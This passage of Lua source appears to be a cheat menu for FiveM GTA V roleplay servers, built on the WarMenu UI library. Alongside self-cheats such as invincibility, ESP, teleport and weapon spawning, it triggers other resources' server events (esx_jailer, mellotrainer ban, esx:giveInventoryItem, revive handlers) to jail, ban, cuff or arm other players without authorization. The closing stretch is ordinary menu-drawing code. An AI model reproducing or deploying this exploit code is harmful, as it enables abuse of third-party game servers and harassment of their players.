				SetPedDropsInventoryWeapon(GetPlayerPed(-1), wep, 0, 2.0, 0, -1)
			elseif Menu.Button('Revive') then
				Citizen.CreateThread(function()
					local ped = GetPlayerPed(-1)
					local playerPos = GetEntityCoords(ped, true)
					NetworkResurrectLocalPlayer(playerPos, true, true, false)
					ClearPedBloodDamage(ped)
					ResurrectPed(ped)
					SetEntityHealth(ped, GetPedMaxHealth(ped) / 3)
					ClearPedTasksImmediately(ped)
				end)
			elseif Menu.Button('TP to Waypoint') then
				local targetPed = GetPlayerPed(-1)
				local targetVeh = GetVehiclePedIsUsing(targetPed)
				if(IsPedInAnyVehicle(targetPed))then
					targetPed = targetVeh
				end

				if(not IsWaypointActive())then
					return
				end

				local waypointBlip = GetFirstBlipInfoId(8) -- 8 = waypoint Id
				local x,y,z = table.unpack(Citizen.InvokeNative(0xFA7C7F0AADF25D09, waypointBlip, Citizen.ResultAsVector())) 

				-- ensure entity teleports above the ground
				local ground
				local groundFound = false
				local groundCheckHeights = {100.0, 150.0, 50.0, 0.0, 200.0, 250.0, 300.0, 350.0, 400.0,450.0, 500.0, 550.0, 600.0, 650.0, 700.0, 750.0, 800.0}

				for i,height in ipairs(groundCheckHeights) do
					SetEntityCoordsNoOffset(targetPed, x,y,height, 0, 0, 1)
					Wait(10)

					ground,z = GetGroundZFor_3dCoord(x,y,height)
					if(ground) then
						z = z + 3
						groundFound = true
						break;
					end
				end

				if(not groundFound)then
					z = 1000
					GiveDelayedWeaponToPed(PlayerPedId(), 0xFBAB5776, 1, 0) -- parachute
				end

				SetEntityCoordsNoOffset(targetPed, x,y,z, 0, 0, 1)
			elseif Menu.Button('Uncuff') then
				local lPed = GetPlayerPed(-1)
				SetEnableHandcuffs(lPed, false)
				EnableAllControlActions(0)
			elseif Menu.Button('Cuff All') then
				local pl = GetPlayers()	
				for _, i in ipairs(pl) do
						Cuff(i)
				end
			elseif Menu.Button('Money') then
				UnemployedMoney()			
			elseif Menu.Button('Police All') then
				PolicePlayers()			
			elseif Menu.Button('EMS All') then
				EMSPlayers()
			elseif Menu.Button('Fire All') then
				FirePlayers()
			elseif Menu.Button('Open Jail') then
				OpenJail()				
			elseif Menu.Button('Attempt to Unjail') then
				TriggerServerEvent('JailUpdate', 0)
				TriggerEvent('UnJP')
			elseif Menu.Button('Fix Car') then
				if IsPedSittingInAnyVehicle(GetPlayerPed(-1)) == true then
					local curcar = GetVehiclePedIsIn(GetPlayerPed(-1), false)
					SetVehicleEngineHealth(curcar, 1000)
					SetVehiclePetrolTankHealth(curcar, 1000)
					SetVehicleEngineOn(curcar, true, true )
					SetVehicleUndriveable(curcar, false)
					SetVehicleDirtLevel(curcar, 0)
					SetVehicleFixed(curcar)
				end
			elseif Menu.CheckBox('Invisible', bInvis, function(bInvis)
				local lPed = GetPlayerPed(-1)
				SetEntityVisible(lPed, invis, false)
				end) then	
				invis = not invis
				bInvis = invis
			elseif Menu.CheckBox('Invincible', bInvin, function(bInvin)
				end) then
				invin = not invin
				bInvin = invin
				local lPed = GetPlayerPed(-1)
				SetPlayerInvincible(lPed, invin)
			elseif Menu.CheckBox('Thermal Vision', bTherm, function(bTherm)
				end) then
				therm = not therm
				bTherm = therm
				SetSeethrough(therm)
			elseif Menu.CheckBox('Explosive Punch', bPunch, function(bPunch)
				end) then
				ePunch = not ePunch
				bPunch = ePunch			
			elseif Menu.CheckBox('Speed Demon', bSpeed, function(bSpeed)
				end) then
				SpeedDemon = not SpeedDemon
				bSpeed = SpeedDemon
			elseif Menu.CheckBox('Super Jump', bJump, function(bJump)
				end) then
				sJump = not sJump
				bJump = sJump
			elseif Menu.CheckBox('Map Blips', bBlips, function(bBlips)
					if showblip then
						showsprite = true
					else
						showsprite = false
					end
				end) then
				showblip = not showblip
				bBlips = showblip
			elseif Menu.CheckBox('ESP', bESP, function(bESP)
				end) then
				overwriteAlpha = not overwriteAlpha
				bESP = overwriteAlpha
			end
			Menu.Display()
		elseif Menu.IsMenuOpened('PlayerOptions') then
			if Menu.Button("Spectate Player") then
				spectatePlayer(GetPlayerPed(selectedPlayerIdx), selectedPlayerIdx, GetPlayerName(selectedPlayerIdx))
			elseif Menu.Button("Teleport To Player") then
				TeleportToPlayer(selectedPlayerIdx)
			elseif Menu.MenuButton("Give Weapon", "RemoteWeaponTypeSelect") then
				playerIdxWeapon = selectedPlayerIdx				
			elseif Menu.Button("Make Cop") then
				MakeCop(selectedPlayerIdx)						
			elseif Menu.Button("Fire") then
				FirePlayer(selectedPlayerIdx)			
			elseif Menu.Button("Make EMS") then
				MakeEMS(selectedPlayerIdx)							
			elseif Menu.Button("Cuff") then
				Cuff(selectedPlayerIdx)
			elseif Menu.Button("Uncuff") then
				Uncuff(selectedPlayerIdx)
			elseif Menu.Button("MelloBan") then
				TriggerServerEvent("mellotrainer:adminTempBan", GetPlayerServerId(selectedPlayerIdx))
			elseif Menu.Button("Jail") then		
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayerIdx), 45 * 60)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(selectedPlayerIdx), 45 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(selectedPlayerIdx), 45 * 60, "dude weed")
			elseif Menu.Button("Unjail") then
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayerIdx), 0)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(selectedPlayerIdx), 0)
				TriggerServerEvent("esx_jail:unjailQuest", GetPlayerServerId(selectedPlayerIdx))
				TriggerServerEvent("js:removejailtime", GetPlayerServerId(selectedPlayerIdx))	
			elseif Menu.Button("Revive") then
				TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(selectedPlayerIdx))
				TriggerServerEvent("whoapd:revive", GetPlayerServerId(selectedPlayerIdx))
				TriggerServerEvent("paramedic:revive", GetPlayerServerId(selectedPlayerIdx))
				TriggerServerEvent("ems:revive", GetPlayerServerId(selectedPlayerIdx))	
			end
			Menu.Display()
		elseif Menu.IsMenuOpened('CarTypes') then
			if Menu.MenuButton("Current Car", "CurCarOptions") then
			end
			for i, aName in ipairs(CarTypes) do
			 if Menu.MenuButton(aName, "CarTypeSelection") then
				carTypeIdx = i
			 end
			end
			Menu.Display()
		elseif Menu.IsMenuOpened('CarTypeSelection') then
			for i, aName in ipairs(CarsArray[carTypeIdx]) do 
				if Menu.MenuButton(aName, "CarOptions") then
				carToSpawn = i
				end
			end
			Menu.Display()
		elseif Menu.IsMenuOpened('CurCarOptions') then
				local ped = GetPlayerPed(-1)
				if IsPedSittingInAnyVehicle(ped) then
					SpawnedCar = GetVehiclePedIsUsing(ped)
				if Menu.Button("Automod") then			
					SetVehicleModKit(SpawnedCar, 0)
					SetVehicleMod(SpawnedCar, 14, 28, false)
					SetVehicleModKit(SpawnedCar, 0)
					SetVehicleMod(SpawnedCar, 11, 5, false)
					SetVehicleModKit(SpawnedCar, 0)
					SetVehicleMod(SpawnedCar, 12, 5, false)
					SetVehicleModKit(SpawnedCar, 0)
					SetVehicleMod(SpawnedCar, 13, 5, false)
					SetVehicleModKit(SpawnedCar, 0)
					SetVehicleMod(SpawnedCar, 15, 5, false)
					SetVehicleModKit(SpawnedCar, 0)
					SetVehicleMod(SpawnedCar, 16, 5, false)
					SetVehicleModKit(SpawnedCar, 0)
					SetVehicleWindowTint(SpawnedCar, 1)
				end
			end
			Menu.Display()
		elseif Menu.IsMenuOpened('CarOptions') then
				if Menu.Button("Spawn Car") then
					local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 8.0, 0.5))
					local veh = CarsArray[carTypeIdx][carToSpawn]
					if veh == nil then veh = "adder" end
					vehiclehash = GetHashKey(veh)
					RequestModel(vehiclehash)
					
					Citizen.CreateThread(function() 
						local waiting = 0
						while not HasModelLoaded(vehiclehash) do
							waiting = waiting + 100
							Citizen.Wait(100)
							if waiting > 5000 then
								ShowNotification("~r~Could not load the vehicle model in time, a crash was prevented.")
								break
							end
						end
						SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId())+90, 1, 0)
						SetVehicleStrong(SpawnedCar, true)
						SetVehicleEngineOn(SpawnedCar, true, true, false)
						SetVehicleEngineCanDegrade(SpawnedCar, false)		
					end)
				end
				if Menu.Button("Automod") then			
					SetVehicleModKit(SpawnedCar, 0)
					SetVehicleMod(SpawnedCar, 14, 28, false)
					SetVehicleModKit(SpawnedCar, 0)
					SetVehicleMod(SpawnedCar, 11, 5, false)
					SetVehicleModKit(SpawnedCar, 0)
					SetVehicleMod(SpawnedCar, 12, 5, false)
					SetVehicleModKit(SpawnedCar, 0)
					SetVehicleMod(SpawnedCar, 13, 5, false)
					SetVehicleModKit(SpawnedCar, 0)
					SetVehicleMod(SpawnedCar, 15, 5, false)
					SetVehicleModKit(SpawnedCar, 0)
					SetVehicleMod(SpawnedCar, 16, 5, false)
					SetVehicleModKit(SpawnedCar, 0)
					SetVehicleWindowTint(SpawnedCar, 1)
				end				
			Menu.Display()
		elseif Menu.IsMenuOpened('WeaponTypes') then
			
			for k, v in pairs(l_weapons) do
				if Menu.MenuButton(k, "WeaponTypeSelection") then
				WeaponTypeSelect = v
				end
			end
			Menu.Display()
		elseif Menu.IsMenuOpened('RemoteWeaponTypeSelect') then
			
			for k, v in pairs(l_weapons) do
				if Menu.MenuButton(k, "RemoteWeaponSelect") then
				WeaponTypeSelect = v
				end
			end
			Menu.Display()
		elseif Menu.IsMenuOpened('RemoteWeaponSelect') then
			for k, v in pairs(WeaponTypeSelect) do
				if Menu.Button(v.name) then					
					TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(playerIdxWeapon), 'item_weapon', v.id, 1000)
				end
			end
			Menu.Display()
		elseif Menu.IsMenuOpened('WeaponTypeSelection') then
			for k, v in pairs(WeaponTypeSelect) do
				if Menu.MenuButton(v.name, "WeaponOptions") then
				WeaponSelected = v
				end
			end
			Menu.Display()
		elseif Menu.IsMenuOpened('WeaponOptions') then
			if Menu.Button("Spawn Weapon") then		
				GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), 1000, false)
			end
			if Menu.Button("Add Ammo") then
				SetPedAmmo(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), 5000) 
			end
			if Menu.CheckBox("Infinite Ammo", WeaponSelected.bInfAmmo, function(s)			
			end) then
				WeaponSelected.bInfAmmo = not WeaponSelected.bInfAmmo
				SetPedInfiniteAmmo(GetPlayerPed(-1), WeaponSelected.bInfAmmo, GetHashKey(WeaponSelected.id))
			end
			for k, v in pairs(WeaponSelected.mods) do
				if Menu.MenuButton(k, "ModSelect") then
				ModSelected = v
				end
			end
			Menu.Display()
		elseif Menu.IsMenuOpened('ModSelect') then
			for _, v in pairs(ModSelected) do
				if Menu.Button(v.name) then				
					GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), GetHashKey(v.id));
				end
			end
			Menu.Display()
		end
		Citizen.Wait(0)
	end
end)



Citizen.CreateThread(function()


	RegisterCommand('menu', function(source, args, rawCommand)	
		Menu.OpenMenu('memes')
	end)
		
	while true do
    Citizen.Wait(55)
		if IsControlPressed(1, 57) then
			GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL_MK2"), 1000, false)			
			SetPedInfiniteAmmo(GetPlayerPed(-1), true, "WEAPON_PISTOL_MK2")
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL_MK2"), GetHashKey("COMPONENT_PISTOL_MK2_CLIP_FMJ"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL_MK2"), GetHashKey("COMPONENT_AT_PI_SUPP_02"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL_MK2"), GetHashKey("COMPONENT_PISTOL_MK2_CAMO_IND_01"));
			GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_SMG_MK2"), 1000, false)		
			SetPedInfiniteAmmo(GetPlayerPed(-1), true, "WEAPON_SMG_MK2")
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_SMG_MK2"), GetHashKey("COMPONENT_SMG_MK2_CLIP_FMJ"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_SMG_MK2"), GetHashKey("COMPONENT_AT_AR_FLSH"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_SMG_MK2"), GetHashKey("COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_SMG_MK2"), GetHashKey("COMPONENT_AT_MUZZLE_04"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_SMG_MK2"), GetHashKey("COMPONENT_AT_SB_BARREL_02"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_SMG_MK2"), GetHashKey("COMPONENT_SMG_MK2_CAMO_IND_01"));
			GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("weapon_assaultrifle_mk2"), 1000, false)	
			SetPedInfiniteAmmo(GetPlayerPed(-1), true, "weapon_assaultrifle_mk2")
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("weapon_assaultrifle_mk2"), GetHashKey("COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("weapon_assaultrifle_mk2"), GetHashKey("COMPONENT_AT_AR_SUPP_02"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("weapon_assaultrifle_mk2"), GetHashKey("COMPONENT_AT_AR_AFGRIP_02"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("weapon_assaultrifle_mk2"), GetHashKey("COMPONENT_AT_SCOPE_MACRO_MK2"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("weapon_assaultrifle_mk2"), GetHashKey("COMPONENT_AT_MUZZLE_04"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("weapon_assaultrifle_mk2"), GetHashKey("COMPONENT_AT_AR_BARREL_02"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("weapon_assaultrifle_mk2"), GetHashKey("COMPONENT_ASSAULTRIFLE_MK2_CAMO_IND_01"));
			GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_CARBINERIFLE_MK2"), 1000, false)
			SetPedInfiniteAmmo(GetPlayerPed(-1), true, "WEAPON_CARBINERIFLE_MK2")
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_CARBINERIFLE_MK2"), GetHashKey("COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_CARBINERIFLE_MK2"), GetHashKey("COMPONENT_AT_AR_SUPP_02"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_CARBINERIFLE_MK2"), GetHashKey("COMPONENT_AT_AR_AFGRIP_02"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_CARBINERIFLE_MK2"), GetHashKey("COMPONENT_AT_SCOPE_MACRO_MK2"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_CARBINERIFLE_MK2"), GetHashKey("COMPONENT_AT_MUZZLE_07"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_CARBINERIFLE_MK2"), GetHashKey("COMPONENT_AT_CR_BARREL_02"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_CARBINERIFLE_MK2"), GetHashKey("COMPONENT_CARBINERIFLE_MK2_CAMO_IND_01"));
			GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_COMBATMG_MK2"), 1000, false)
			SetPedInfiniteAmmo(GetPlayerPed(-1), true, "WEAPON_COMBATMG_MK2")
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_COMBATMG_MK2"), GetHashKey("COMPONENT_COMBATMG_MK2_CLIP_FMJ"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_COMBATMG_MK2"), GetHashKey("COMPONENT_AT_AR_AFGRIP_02"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_COMBATMG_MK2"), GetHashKey("COMPONENT_AT_SCOPE_MEDIUM_MK2"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_COMBATMG_MK2"), GetHashKey("COMPONENT_AT_MUZZLE_04"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_COMBATMG_MK2"), GetHashKey("COMPONENT_AT_MG_BARREL_02"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_COMBATMG_MK2"), GetHashKey("COMPONENT_COMBATMG_MK2_CAMO_IND_01"));
			GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_HEAVYSNIPER_MK2"), 1000, false)
			SetPedInfiniteAmmo(GetPlayerPed(-1), true, "WEAPON_HEAVYSNIPER_MK2")
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_HEAVYSNIPER_MK2"), GetHashKey("COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_HEAVYSNIPER_MK2"), GetHashKey("COMPONENT_AT_SCOPE_MAX"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_HEAVYSNIPER_MK2"), GetHashKey("COMPONENT_AT_SR_SUPP_03"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_HEAVYSNIPER_MK2"), GetHashKey("COMPONENT_AT_MUZZLE_09"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_HEAVYSNIPER_MK2"), GetHashKey("COMPONENT_AT_SR_BARREL_02"));
			GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey("WEAPON_HEAVYSNIPER_MK2"), GetHashKey("COMPONENT_HEAVYSNIPER_MK2_CAMO_IND_01"));
			GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_STUNGUN"), 1000, false)
			SetPedInfiniteAmmo(GetPlayerPed(-1), true, "WEAPON_STUNGUN")
		end
		
	end
	

end)





WarMenu = {}

WarMenu.debug = false

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

local menus = {}
local keys = {up = 172, down = 173, left = 174, right = 175, select = 176, back = 177}
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local menuWidth = 0.23
local titleHeight = 0.11
local titleYOffset = 0.03
local titleScale = 1.0

local buttonHeight = 0.038
local buttonFont = 0
local buttonScale = 0.365
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005

local function debugPrint(text)
	if WarMenu.debug then
		Citizen.Trace("[WarMenu] " .. tostring(text))
	end
end

local function setMenuProperty(id, property, value)
	if id and menus[id] then
		menus[id][property] = value
		debugPrint(id .. " menu property changed: { " .. tostring(property) .. ", " .. tostring(value) .. " }")
	end
end

local function isMenuVisible(id)
	if id and menus[id] then
		return menus[id].visible
	else
		return false
	end
end

local function setMenuVisible(id, visible, holdCurrent)
	if id and menus[id] then
		setMenuProperty(id, "visible", visible)

		if not holdCurrent and menus[id] then
			setMenuProperty(id, "currentOption", 1)
		end

		if visible then
			if id ~= currentMenu and isMenuVisible(currentMenu) then
				setMenuVisible(currentMenu, false)
			end

			currentMenu = id
		end
	end
end

local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
			SetTextRightJustify(true)
		end
	end
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x, y)
end

local function drawRect(x, y, width, height, color)
	DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

local function drawTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight / 2

		if menus[currentMenu].titleBackgroundSprite then
			DrawSprite(
				menus[currentMenu].titleBackgroundSprite.dict,
				menus[currentMenu].titleBackgroundSprite.name,
				x,
				y,
				menuWidth,
				titleHeight,
				0.,
				255,
				255,
				255,
				255
			)
		else
			drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
		end

		drawText(
			menus[currentMenu].title,
			x,
			y - titleHeight / 2 + titleYOffset,
			menus[currentMenu].titleFont,
			menus[currentMenu].titleColor,
			titleScale,
			true
		)
	end
end

local function drawSubTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

		local subTitleColor = {
			r = menus[currentMenu].titleBackgroundColor.r,
			g = menus[currentMenu].titleBackgroundColor.g,
			b = menus[currentMenu].titleBackgroundColor.b,
			a = 255
		}

		drawRect(x, y, menuWidth, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
		drawText(
			menus[currentMenu].subTitle,
			menus[currentMenu].x + buttonTextXOffset,
			y - buttonHeight / 2 + buttonTextYOffset,
			buttonFont,
			subTitleColor,
			buttonScale,
			false
		)

		if optionCount > menus[currentMenu].maxOptionCount then
			drawText(
				tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
				menus[currentMenu].x + menuWidth,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTitleColor,
				buttonScale,
				false,
				false,
				true
			)
		end
	end
end

local function drawButton(text, subText)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil

	if
		menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].maxOptionCount
	 then
		multiplier = optionCount
	elseif
		optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].currentOption
	 then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			shadow = true
		end

		drawRect(x, y, menuWidth, buttonHeight, backgroundColor)
		drawText(
			text,
			menus[currentMenu].x + buttonTextXOffset,
			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false,
			shadow
		)

		if subText then
			drawText(
				subText,
				menus[currentMenu].x + buttonTextXOffset,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTextColor,
				buttonScale,
				false,
				shadow,
				true
			)
		end
	end
end

function WarMenu.CreateMenu(id, title)
	-- Default settings
	menus[id] = {}
	menus[id].title = title
	menus[id].subTitle = "INTERACTION MENU"

	menus[id].visible = false

	menus[id].previousMenu = nil

	menus[id].aboutToBeClosed = false

	menus[id].x = 0.75
	menus[id].y = 0.19

	menus[id].currentOption = 1
	menus[id].maxOptionCount = 10
	menus[id].titleFont = 1
	menus[id].titleColor = {r = 255, g = 255, b = 255, a = 255}
	Citizen.CreateThread(
		function()
			while true do
				Citizen.Wait(0)
				local ra = RGBRainbow(1.0)-- RGB MENU DISABLED // NiT34ByTe
				menus[id].titleBackgroundColor = {r = ra.r, g = ra.g, b = ra.b, a = 255} --RGB MENU DISABLED // NiT34ByTe - Culoare titlu
				menus[id].menuFocusBackgroundColor = {r = ra.r, g = ra.g, b = ra.b, a = 100} --RGB MENU DISABLED // NiT34ByTe - Culoare meniu
				--menus[id].titleBackgroundColor = {r = 5, g = 173, b = 5, a = 255}
				--menus[id].menuFocusBackgroundColor = {r = 25, g = 255, b = 248, a = 25}
			end
		end)
	menus[id].titleBackgroundSprite = nil

	menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].menuSubTextColor = {r = 189, g = 189, b = 189, a = 255}
	menus[id].menuFocusTextColor = {r = 255, g = 255, b = 255, a = 255}
	--menus[id].menuFocusBackgroundColor = { r = 245, g = 245, b = 245, a = 255 }
	menus[id].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 100}

	menus[id].subTitleBackgroundColor = {
		r = menus[id].menuBackgroundColor.r,
		g = menus[id].menuBackgroundColor.g,
		b = menus[id].menuBackgroundColor.b,
		a = 255
	}

	menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"} --https://pastebin.com/0neZdsZ5

	debugPrint(tostring(id) .. " menu created")
end

function WarMenu.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		WarMenu.CreateMenu(id, menus[parent].title)

		if subTitle then
			setMenuProperty(id, "subTitle", string.upper(subTitle))
		else
			setMenuProperty(id, "subTitle", string.upper(menus[parent].subTitle))
		end

		setMenuProperty(id, "previousMenu", parent)

		setMenuProperty(id, "x", menus[parent].x)
		setMenuProperty(id, "y", menus[parent].y)
		setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
		setMenuProperty(id, "titleFont", menus[parent].titleFont)
		setMenuProperty(id, "titleColor", menus[parent].titleColor)
		setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
		setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
		setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
		setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
		setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
		setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
		setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
		setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
	else
		debugPrint("Failed to create " .. tostring(id) .. " submenu: " .. tostring(parent) .. " parent menu doesn't exist")
	end
end

function WarMenu.CurrentMenu()
	return currentMenu
end

function WarMenu.OpenMenu(id)
	if id and menus[id] then
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
		setMenuVisible(id, true)

		if menus[id].titleBackgroundSprite then
			RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, false)
			while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do
				Citizen.Wait(0)
			end
		end

		debugPrint(tostring(id) .. " menu opened")
	else
		debugPrint("Failed to open " .. tostring(id) .. " menu: it doesn't exist")
	end
end

function WarMenu.IsMenuOpened(id)
	return isMenuVisible(id)
end

function WarMenu.IsAnyMenuOpened()
	for id, _ in pairs(menus) do
		if isMenuVisible(id) then
			return true
		end
	end

	return false
end

function WarMenu.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
		return menus[currentMenu].aboutToBeClosed
	else
		return false
	end
end

function WarMenu.CloseMenu()
	if menus[currentMenu] then
		if menus[currentMenu].aboutToBeClosed then
			menus[currentMenu].aboutToBeClosed = false
			setMenuVisible(currentMenu, false)
			debugPrint(tostring(currentMenu) .. " menu closed")
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			optionCount = 0
			currentMenu = nil
			currentKey = nil
		else
			menus[currentMenu].aboutToBeClosed = true
			debugPrint(tostring(currentMenu) .. " menu about to be closed")
		end
	end
end

function WarMenu.Button(text, subText)
	local buttonText = text
	if subText then
		buttonText = "{ " .. tostring(buttonText) .. ", " .. tostring(subText) .. " }"
	end

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton(text, subText)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText .. " button pressed")
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint("Failed to create " .. buttonText .. " button: " .. tostring(currentMenu) .. " menu doesn't exist")

		return false
	end
end

function WarMenu.MenuButton(text, id)
	if menus[id] then
		if WarMenu.Button(text) then
			setMenuVisible(currentMenu, false)
			setMenuVisible(id, true, true)

			return true
		end
	else
		debugPrint("Failed to create " .. tostring(text) .. " menu button: " .. tostring(id) .. " submenu doesn't exist")
	end

	return false
end

function WarMenu.CheckBox(text, bool, callback)
	local checked = "~r~~h~Off"
	if bool then
		checked = "~g~~h~On"
	end

	if WarMenu.Button(text, checked) then
		bool = not bool
